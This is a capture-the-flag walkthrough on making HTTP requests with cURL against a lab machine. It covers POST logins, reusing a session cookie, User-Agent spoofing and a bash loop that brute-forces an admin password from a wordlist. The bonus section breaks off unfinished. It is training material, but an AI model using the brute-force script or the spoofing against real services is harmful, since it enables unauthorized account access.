# Concept 
* making HTTP requests with cURL
# Method of solve
## Q1 - Make a POST request to the /post.php endpoint with the username admin and the password admin. What is the flag you receive?
* from the AttackBox terminal, use the following command, keeping in mind to replace the `MACHINE_IP` value with the IP address for your target machine:
```
curl -X POST http://MACHINE_IP/post.php -d "username=admin&password=admin"
```
## Q2 - Make a request to the /cookie.php endpoint with the username admin and the password admin and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?
* first use this command to send a POST request to the `/cookie.php` endpoint:
```
curl -v -X POST http://10.65.140.207/cookie.php -d "username=admin&password=admin"
```
* we should receive a cookie with the key `PHPSESSID`. Make sure to include the whole value of that cookie in the next command:
```
curl -b "PHPSESSID=Replace_This_Value" http://10.65.140.207/cookie.php
```
## Q3 - After doing the brute force on the /bruteforce.php endpoint, what is the password of the admin user?
* create a file named `loop.sh` in the AttackBox terminal with the following contents:
```
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```
* next, create a file named `passwords.txt` with the following contents:
```
admin123
password
letmein
secretpass
secret
```
* use the following command to make the `loop.sh` file executable:
```
chmod +x loop.sh
```
* finally, run the script:
```
./loop.sh
```
## Q4 - Make a request to the /agent.php endpoint with the user-agent TBFC. What is the flag your receive?
* use the following command to make a request with a modified User-Agent value:
```
curl -A TBFC http://MACHINE_IP/agent.php
```
## Q5 - Bonus question: Can you solve the Final Mission and get the flag?
* user the following `curl` command to see what's going on:
```
curl http://10.65.140.207/terminal.php?action=panel
```
* it looks like we might need to use a custom user agent to access the page:
```
curl -A secretcomputer http://10.65.140.207/terminal.php?action=panel
```
* now it looks like we need to brute force a valid password for the admin account:
* we can use the same loop.sh script, but use the /usr/share/wordlists/rockyou.txt wordlist instead
* work in progress...
